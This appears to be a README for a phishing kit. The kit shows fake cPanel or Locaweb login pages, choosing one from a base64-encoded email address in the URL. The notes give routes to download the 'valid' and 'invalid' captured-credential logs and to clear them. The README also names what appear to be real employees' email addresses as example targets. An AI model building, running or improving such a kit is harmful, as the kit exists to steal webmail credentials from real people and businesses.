# Phishing cPanel & Locaweb

BASE64_email_LocaWeb = ZGllZ28ubWF0aGlhc0BzYWZyYW1hLmNvbS5icg== (diego.mathias@saframa.com.br)
BASE64_email_cPanel = YXNjb25AY29udGFiaWxpZGFkZWFzY29uLmNvbS5icg== (ascon@contabilidadeascon.com.br)

URL Rota de Login: http://localhost/login/ZGllZ28ubWF0aGlhc0BzYWZyYW1hLmNvbS5icg==
URL Rota de Login: http://localhost/login/YXNjb25AY29udGFiaWxpZGFkZWFzY29uLmNvbS5icg==

    - Pelo e-mail é verificado o provedor, se o provedor ser cPanel ou locaweb a página é exibida de acordo com o provedor necessário


Rota de Download Logs Válidos: http://localhost/download/logs/valid

Rota de Download Logs Inválidos: http://localhost/download/logs/invalid

Rota para Limpar os Logs: http://localhost/logs/clear
